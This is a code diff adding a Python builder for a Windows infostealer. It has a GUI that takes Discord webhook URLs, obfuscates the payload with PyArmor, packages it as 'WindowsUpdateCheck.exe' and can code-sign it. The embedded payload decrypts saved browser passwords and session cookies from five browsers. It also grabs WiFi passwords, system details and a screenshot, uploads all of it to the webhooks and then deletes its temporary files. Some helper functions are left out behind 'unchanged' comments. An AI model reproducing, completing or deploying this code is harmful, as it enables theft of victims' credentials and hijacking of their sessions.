@@ -436,3 +436,416 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
 if __name__ == "__main__":
     get_webhook()
+
+
+
+
+
+
+
+
+import os
+import subprocess
+import tkinter as tk
+from tkinter import messagebox, ttk, scrolledtext
+import shutil
+import tempfile
+import textwrap
+import requests
+
+# =================== WEBHOOK TEST ===================
+def test_webhook(hook):
+    try:
+        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
+        if resp.status_code in (200, 204):
+            return True, "Webhook working - test message sent."
+        else:
+            return False, f"Failed ({resp.status_code})"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
+# =================== GUI ===================
+def get_webhook():
+    root = tk.Tk()
+    root.title("Recon Stealer Builder - Cookie Yoinker Edition")
+    root.geometry("800x600")
+    root.resizable(False, False)
+
+    notebook = ttk.Notebook(root)
+    notebook.pack(fill="both", expand=True, padx=10, pady=10)
+
+    build_frame = ttk.Frame(notebook)
+    notebook.add(build_frame, text="Build")
+
+    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = ttk.Entry(build_frame, width=100)
+    webhook_entry.pack(pady=5)
+
+    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
+    pfx_entry = ttk.Entry(build_frame, width=100)
+    pfx_entry.pack(pady=5)
+
+    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
+    pass_entry = ttk.Entry(build_frame, width=100, show="*")
+    pass_entry.pack(pady=5)
+
+    ttk.Label(build_frame, text="Obfuscation Mode (0 for free/no license):", font=("Arial", 10, "bold")).pack(pady=10)
+    mode_var = tk.IntVar(value=0)
+    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial)", variable=mode_var, value=0).pack()
+    ttk.Radiobutton(build_frame, text="1 - Advanced (mix-str etc. - needs paid)", variable=mode_var, value=1).pack()
+    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()
+
+    def run_test():
+        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
+        if not hooks:
+            messagebox.showerror("Nope", "Enter at least one webhook.")
+            return
+        results = []
+        for h in hooks:
+            success, msg = test_webhook(h)
+            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
+        messagebox.showinfo("Test Results", "\n".join(results))
+
+    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)
+
+    progress = ttk.Progressbar(build_frame, mode="indeterminate")
+
+    def build():
+        raw_hooks = webhook_entry.get().strip()
+        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
+            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
+            return
+        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
+        pfx_path = pfx_entry.get().strip()
+        pfx_pass = pass_entry.get().strip() or None
+        mode = mode_var.get()
+
+        progress.pack(pady=15)
+        progress.start()
+        root.update()
+
+        try:
+            generate_malware(webhooks, pfx_path, pfx_pass, mode)
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showinfo("Built", "stealer.exe ready - COOKIE YOINKER EDITION.\nRecon + Screenshot + Multi-browser PW + Cookies + WiFi + Software.\nSilent exfil.")
+        except Exception as e:
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showerror("Error", f"{str(e)}")
+        root.destroy()
+
+    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)
+
+    info_frame = ttk.Frame(notebook)
+    notebook.add(info_frame, text="Info / Licenses")
+
+    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
+    info_text.pack(padx=10, pady=10)
+
+    license_info = textwrap.dedent('''
+    PYARMOR v9.x (Dec 2025)
+    No license = mode 0 only.
+    Now yoinks:
+    - Recon + screenshot
+    - Passwords from Chrome/Edge/Opera/Brave/Vivaldi
+    - COOKIES from all above (session hijack heaven)
+    - WiFi passwords
+    - Installed software
+    ''')
+    info_text.insert(tk.END, license_info)
+    info_text.config(state=tk.DISABLED)
+
+    root.mainloop()
+
+# =================== STEALER CODE - NOW WITH COOKIE YOINKING ===================
+stealer_code = textwrap.dedent('''
+import os
+import sys
+import time
+import subprocess
+import socket
+import requests
+import ctypes
+import platform
+import uuid
+import winreg
+import random
+from datetime import datetime
+
+try:
+    import pyautogui
+    HAS_PYAUTO = True
+except:
+    HAS_PYAUTO = False
+
+import sqlite3
+import json
+import base64
+import shutil
+from Crypto.Cipher import AES
+import win32crypt
+
+BROWSERS = {
+    "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default"),
+    "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data", "Default"),
+    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+    "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+    "Vivaldi": os.path.join(os.getenv("APPDATA"), "Vivaldi", "User Data", "Default")
+}
+
+# [VM / IP / HWID functions unchanged - same as before]
+
+def grab_browser_passwords(browser_name, profile_path):
+    data = f"--- {browser_name.upper()} PASSWORDS ---\\n"
+    try:
+        login_db = os.path.join(profile_path, "Login Data")
+        if not os.path.exists(login_db):
+            return f"{browser_name}: No profile/Login Data\\n"
+        temp_db = os.path.join(os.getenv("TEMP"), f"LoginTemp_{browser_name}_{random.randint(10000,99999)}.db")
+        shutil.copyfile(login_db, temp_db)
+
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        
+        found = False
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[1]
+            encrypted_pw = row[2]
+            if encrypted_pw:
+                found = True
+                try:
+                    pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
+                except:
+                    try:
+                        local_state = os.path.join(os.path.dirname(profile_path), "Local State")
+                        with open(local_state, "r", encoding="utf-8") as f:
+                            js = json.loads(f.read())
+                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
+                        iv = encrypted_pw[3:15]
+                        ciphertext = encrypted_pw[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        pw = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
+                    except:
+                        pw = "DECRYPT FAILED"
+                data += f"{url} | {username} | {pw}\\n"
+        conn.close()
+        os.remove(temp_db)
+        if not found:
+            data += "No saved passwords\\n"
+    except Exception as e:
+        data += f"Error: {str(e)}\\n"
+    return data
+
+def grab_browser_cookies(browser_name, profile_path):
+    data = f"--- {browser_name.upper()} COOKIES ---\\n"
+    try:
+        cookies_db = os.path.join(profile_path, "Network", "Cookies")  # Cookies are in Network subfolder
+        if not os.path.exists(cookies_db):
+            return f"{browser_name}: No Cookies DB\\n"
+        temp_db = os.path.join(os.getenv("TEMP"), f"CookiesTemp_{browser_name}_{random.randint(10000,99999)}.db")
+        shutil.copyfile(cookies_db, temp_db)
+
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        
+        found = False
+        for row in cursor.fetchall():
+            host = row[0]
+            name = row[1]
+            encrypted_val = row[2]
+            if encrypted_val:
+                found = True
+                try:
+                    val = win32crypt.CryptUnprotectData(encrypted_val, None, None, None, 0)[1].decode('utf-8')
+                except:
+                    try:
+                        local_state = os.path.join(os.path.dirname(profile_path), "Local State")
+                        with open(local_state, "r", encoding="utf-8") as f:
+                            js = json.loads(f.read())
+                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
+                        iv = encrypted_val[3:15]
+                        ciphertext = encrypted_val[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        val = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
+                    except:
+                        val = "DECRYPT FAILED"
+                data += f"{host} | {name} | {val}\\n"
+        conn.close()
+        os.remove(temp_db)
+        if not found:
+            data += "No cookies\\n"
+    except Exception as e:
+        data += f"Error: {str(e)}\\n"
+    return data
+
+# [WiFi / Software unchanged]
+
+def exfil(webhooks):
+    time.sleep(random.uniform(5, 15))
+
+    base_recon = f"""
+RECON REPORT - {datetime.utcnow().isoformat()} UTC
+================================================
+Username      : {os.getenv("USERNAME")}
+Computer Name : {platform.node()}
+OS            : {platform.system()} {platform.release()} ({platform.version()})
+CPU           : {platform.processor()}
+HWID          : {get_hwid()}
+VM Detected   : {is_vm()}
+Public IP     : {get_public_ip()}
+Local IP      : {get_local_ip()}
+"""
+
+    files_to_send = {}
+    temp_files = []
+
+    # Recon
+    recon_path = os.path.join(os.getenv("TEMP"), f"recon_{random.randint(10000,99999)}.txt")
+    with open(recon_path, "w", encoding="utf-8") as f:
+        f.write(base_recon)
+    files_to_send["recon.txt"] = open(recon_path, "rb")
+    temp_files.append(recon_path)
+
+    # Screenshot
+    if HAS_PYAUTO:
+        try:
+            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
+            pyautogui.screenshot(screen_path)
+            files_to_send["screenshot.png"] = open(screen_path, "rb")
+            temp_files.append(screen_path)
+        except: pass
+
+    # Passwords
+    all_pw_data = ""
+    for name, path in BROWSERS.items():
+        all_pw_data += grab_browser_passwords(name, path) + "\\n"
+    if all_pw_data.strip():
+        pw_path = os.path.join(os.getenv("TEMP"), f"browser_pw_{random.randint(10000,99999)}.txt")
+        with open(pw_path, "w", encoding="utf-8") as f:
+            f.write("MULTI-BROWSER PASSWORDS\\n" + all_pw_data)
+        files_to_send["browser_passwords.txt"] = open(pw_path, "rb")
+        temp_files.append(pw_path)
+
+    # COOKIES YOINKED
+    all_cookie_data = ""
+    for name, path in BROWSERS.items():
+        all_cookie_data += grab_browser_cookies(name, path) + "\\n"
+    if all_cookie_data.strip():
+        cookie_path = os.path.join(os.getenv("TEMP"), f"browser_cookies_{random.randint(10000,99999)}.txt")
+        with open(cookie_path, "w", encoding="utf-8") as f:
+            f.write("MULTI-BROWSER COOKIES (session hijack ready)\\n" + all_cookie_data)
+        files_to_send["browser_cookies.txt"] = open(cookie_path, "rb")
+        temp_files.append(cookie_path)
+
+    # WiFi + Software same as before
+    wifi_data = grab_wifi_passwords()
+    if wifi_data.strip():
+        wifi_path = os.path.join(os.getenv("TEMP"), f"wifi_pw_{random.randint(10000,99999)}.txt")
+        with open(wifi_path, "w", encoding="utf-8") as f:
+            f.write("SAVED WIFI PASSWORDS\\n" + wifi_data)
+        files_to_send["wifi_passwords.txt"] = open(wifi_path, "rb")
+        temp_files.append(wifi_path)
+
+    soft_data = list_installed_software()
+    if soft_data.strip():
+        soft_path = os.path.join(os.getenv("TEMP"), f"software_{random.randint(10000,99999)}.txt")
+        with open(soft_path, "w", encoding="utf-8") as f:
+            f.write("INSTALLED SOFTWARE\\n" + soft_data)
+        files_to_send["installed_software.txt"] = open(soft_path, "rb")
+        temp_files.append(soft_path)
+
+    for hook in webhooks:
+        try:
+            payload = {"content": f"**SESSION JACKPOT** - {os.getenv('USERNAME')}@{platform.node()} - Passwords + COOKIES yoinked"}
+            resp = requests.post(hook, data=payload, files=files_to_send, timeout=60)
+            if resp.status_code in (200, 204):
+                break
+        except: continue
+    else:
+        try:
+            requests.post(webhooks[0], json={"content": f"Fallback:\\n```\\n{base_recon}\\n```"})
+        except: pass
+
+    # Cleanup
+    for f in files_to_send.values():
+        try: f.close()
+        except: pass
+    for p in temp_files:
+        try: os.remove(p)
+        except: pass
+
+exfil({WEBHOOK_PLACEHOLDER})
+''')
+
+# =================== BUILD (unchanged - Crypto fix already there) ===================
+def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
+    if not shutil.which("pyarmor"):
+        raise Exception("pyarmor missing - pip install pyarmor")
+    if not shutil.which("pyinstaller"):
+        raise Exception("pyinstaller missing - pip install pyinstaller")
+
+    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
+    script = os.path.join(temp_dir, "recon.py")
+    hook_str = repr(webhooks)
+    with open(script, "w", encoding="utf-8") as f:
+        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))
+
+    obf_dir = os.path.join(temp_dir, "obf")
+
+    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
+    if mode == 1:
+        gen_cmd += ["--advanced", "2", "--mix-str"]
+    elif mode == 2:
+        gen_cmd += ["--enable-rft"]
+    gen_cmd += [script]
+
+    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
+    if result.returncode != 0:
+        raise Exception(f"Pyarmor failed:\n{result.stderr}")
+
+    obf_script = os.path.join(obf_dir, "recon.py")
+
+    hidden_imports = [
+        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
+        "datetime", "random", "subprocess", "os", "sys", "time", "requests",
+        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
+        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"
+    ]
+    hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]
+
+    pyi_cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--clean",
+        "--name", "WindowsUpdateCheck",
+    ] + hidden_args + [obf_script]
+
+    result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
+    if result.returncode != 0:
+        raise Exception(f"PyInstaller failed:\n{result.stderr}")
+
+    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
+    final = os.path.join(os.getcwd(), "stealer.exe")
+    shutil.copyfile(bundled_exe, final)
+
+    if pfx_path and os.path.exists(pfx_path):
+        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
+        if pfx_pass:
+            sign_cmd += ["/p", pfx_pass]
+        sign_cmd += [final]
+        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
+        if sign_result.returncode != 0:
+            print(f"Signing failed:\n{sign_result.stderr}")
+        else:
+            print("Signed.")
+
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    print(f"Cookie yoinker stealer built: {final}")
+
+if __name__ == "__main__":
+    get_webhook()
